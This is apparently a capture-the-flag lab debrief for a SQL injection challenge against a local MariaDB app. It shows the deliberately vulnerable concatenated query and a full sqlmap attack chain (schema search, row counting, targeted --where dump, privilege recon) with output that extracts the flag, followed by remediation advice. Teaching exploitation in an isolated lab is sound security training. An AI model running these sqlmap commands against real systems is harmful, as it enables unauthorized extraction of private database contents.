# The Hall of Cells, Debrief

**Node:** `p2_7` &middot; **Flag:** `SEIYAKU{targeted_beats_dump_all}` &middot; **Route:** `GET /p2/hall` &middot; **Sink:** `challenges/phase2.py`, `mariadb` (16 tables, `cell_records` holds the flag)

New to the shared `sqlmap` flags below (`-u`, `-p`, `--batch`,
`--ignore-stdin`, `-D`/`-T`/`-C`/`--dump`)? They're explained in plain
terms in A Sealed Floor's debrief's "New to sqlmap? Read this once"
section. `--search`, `--count`, `--where`, `--current-user`, `--is-dba`,
and `--privileges`, all new here, are explained below.

## Root cause

The record lookup builds its query the same way every floor in this lab
does, raw string concatenation on a bare, unquoted numeric `id`:

```python
# challenges/phase2.py
q = f"SELECT id, cell_id, inspector, note FROM cell_records WHERE id={record_id}"  # VULN: string concat
cur.execute(q)
rows = cur.fetchall()
```

This is the identical shape A Sealed Floor used: an unquoted numeric slot
leaves boolean-blind, error-based, UNION-based, and time-based all
reachable at once, so sqlmap's plain defaults find the injection
immediately, no new detection work here at all.

## Why this floor is different: the database, not the bug

What's new is what's on the other side of the injection. This database
holds sixteen tables. Fifteen are small, ordinary administrative
bookkeeping, staff rosters, meal schedules, laundry logs, nothing worth
reading. The sixteenth, `cell_records`, is an inspection log with
hundreds of rows, all but one of them exactly as routine as the fifteen
other tables. Finding the interesting *table* by trying each of the
other fifteen by hand would work, but it doesn't scale, and finding the
interesting *row* among hundreds of identical-looking log entries by
reading through a full dump doesn't either. This floor is built to make
"just dump everything" the wrong move, and to teach the sqlmap flags
that make the right move fast.

## The technique: search, count, then extract only what matters

**`--search`** asks a question about the *shape* of the schema instead
of its contents: "does any table have a column whose name looks like
this?" Paired with `-C <name>`, it searches every column name across
every table this connection can see (this floor's own database, and
nothing else, per the Isolation note below) for a partial, case-insensitive
match, and reports exactly where it found one, without you having to run
`--tables` plus `--columns` sixteen separate times:

```
sqlmap -u "http://localhost:8000/p2/hall?id=1" -p id --batch --ignore-stdin --search -C secret
```

```
columns LIKE 'secret' were found in the following databases:
Database: seiyaku_p2_hall
Table: cell_records
[1 column]
+--------+--------------+
| Column | Type         |
+--------+--------------+
| secret | varchar(128) |
+--------+--------------+
```

One command, one clear answer: `cell_records.secret`, out of sixteen
tables, without opening any of the other fifteen at all.

**`--count`** answers "how many rows does this table actually have?"
before you commit to reading them:

```
sqlmap -u "http://localhost:8000/p2/hall?id=1" -p id --batch --ignore-stdin -D seiyaku_p2_hall --count -T cell_records
```

```
Database: seiyaku_p2_hall
+--------------+---------+
| Table        | Entries |
+--------------+---------+
| cell_records | 401     |
+--------------+---------+
```

401 rows is not something to scroll through and read by eye looking for
the one that matters.

**`-C <columns>`** (already introduced in A Sealed Floor's debrief for
picking a table) works the same way for picking specific *columns*:
`-C secret` tells `--dump` to fetch only that column, not every column in
the row.

**`--where "<condition>"`** appends a literal SQL condition to the query
`--dump` builds, the direct way to say "only the rows matching this",
instead of every row in the table:

```
sqlmap -u "http://localhost:8000/p2/hall?id=1" -p id --batch --ignore-stdin \
    -D seiyaku_p2_hall -T cell_records -C secret --where "secret IS NOT NULL" --dump
```

```
Database: seiyaku_p2_hall
Table: cell_records
[1 entry]
+----------------------------------+
| secret                           |
+----------------------------------+
| SEIYAKU{targeted_beats_dump_all} |
+----------------------------------+
```

One row, one column, the flag, out of a table with 401 rows and four
columns, real and verified live against this exact seed
(`solvers/p2_7.sh` runs exactly this chain).

## Just how impractical is "dump everything", really?

It's worth being honest about this rather than just asserting it. Against
this exact seed, using sqlmap's default UNION-based technique (available
here because, like every earlier floor, this sink leaves it open), a full
`--dump -T cell_records` with no `-C`/`--where` narrowing actually
finishes in about 12 seconds, UNION-based extraction batches efficiently
regardless of row count. The real cost isn't wall-clock time in that
case, it's the result: 401 rows of near-identical "routine inspection,
nothing to report" noise that a person still has to scroll through and
read to find the one row that doesn't match. `--search` and `-C`/`--where`
remove that reading step entirely.

Where the impracticality becomes brutally literal is if UNION weren't
available, forcing a blind technique. Timed live against this exact seed,
`--technique=B` (boolean-blind only) extracting all four columns for just
the first 3 of 401 rows (`--start=1 --stop=3`) took **20 seconds**, about
6.7 seconds per row. A full blind dump of all 401 rows extrapolates to
roughly **45 minutes**, character-by-character bisection, against a table
that's mostly identical filler. The same forced boolean-blind technique,
but targeted at just the one row and one column that matters
(`-C secret --where "secret IS NOT NULL"`), recovered the flag in **4.4
seconds**. That gap, real and measured, not estimated from theory, is the
entire case for `--search`/`--count`/`-C`/`--where` over reaching for
`--dump` and walking away: it isn't really about whether UNION happens
to be available on any one target, it's that targeted extraction stays
fast regardless, and a naive full dump's cost can swing from "mildly
noisy" to "wildly impractical" depending on what technique you're
actually stuck with.

## A quick, honest recon aside

Three more sqlmap flags worth knowing, run here as a sanity check on this
lab's own least-privilege design rather than as part of the exploit path:

**`--current-user`** asks the database "who, exactly, am I connected as?":

```
current user: 'svc_p2_hall@%'
```

Confirms this is the floor's own restricted account, not some shared
generic login.

**`--is-dba`** asks "does this account have superuser/administrator
rights?":

```
current user is DBA: False
```

It doesn't, exactly as intended (see Isolation below). A `True` here on
a real engagement would mean the injection just handed over the entire
database server, not just one database.

**`--privileges`** lists what the account can actually do:

```
database management system users privileges:
[*] 'svc_p2_hall'@'%' [1]:
    privilege: USAGE
```

`USAGE` here is honest but easy to misread: it means "no *global*
privileges", not "no privileges at all". This account's real grant
(`SELECT` on `seiyaku_p2_hall.*` only) is a per-database grant, which
this style of privilege enumeration doesn't surface directly, the
injection succeeding at all, against only this floor's own tables, is
the actual proof that grant exists. `--privileges` is genuinely useful
for spotting an over-broad *global* grant; it isn't the last word on a
narrowly-scoped one.

## HxH analogy

A hall built to keep records of everything eventually keeps records of
everything, most of it forgettable the moment it's logged. An applicant
who tries to out-Nen the whole hall's memory at once, reading every
ledger, cross-referencing every page, drowns in paperwork that was never
hiding anything in the first place. The one who actually finds what
matters isn't the one who read the most, it's the one who knew what
question to ask the hall, and asked it directly instead of demanding to
see everything and sorting it out later.

## Remediation

- **Parameterized queries, always**, the same root fix as every floor:

  ```python
  cur.execute(
      "SELECT id, cell_id, inspector, note FROM cell_records WHERE id=%s",
      (record_id,),
  )
  ```

- **Least-privilege database accounts**, and this floor's `--is-dba`/
  `--privileges` results are what that actually looks like from the
  attacker's side: a restricted, non-DBA account whose successful
  injection still can't escalate into full server control, exactly the
  gap between "this one table leaked" and "the whole database server is
  compromised."
- **Data minimization and retention limits.** A table that accumulates
  hundreds of routine, near-identical rows forever is itself a design
  choice with a cost: it's more for an attacker to search through, more
  for a defender to audit, and more that a single injection can expose
  in one sitting. Rotating or archiving old operational logs out of the
  live, reachable database shrinks that blast radius directly.

## Isolation

This floor lives in its own database (`seiyaku_p2_hall`) and connects as
its own restricted user (`svc_p2_hall`), granted access to nothing else.
Verified live: from that user, `information_schema` shows only this
floor's own sixteen tables, and a cross-database read of another
challenge's table is denied (`ERROR 1142`). `--is-dba` independently
confirms the same boundary from sqlmap's own recon: this account is not
a superuser, so even a fully successful injection here stays contained
to this one floor's own database. (Every MariaDB-backed challenge in the
lab is isolated the same way.)
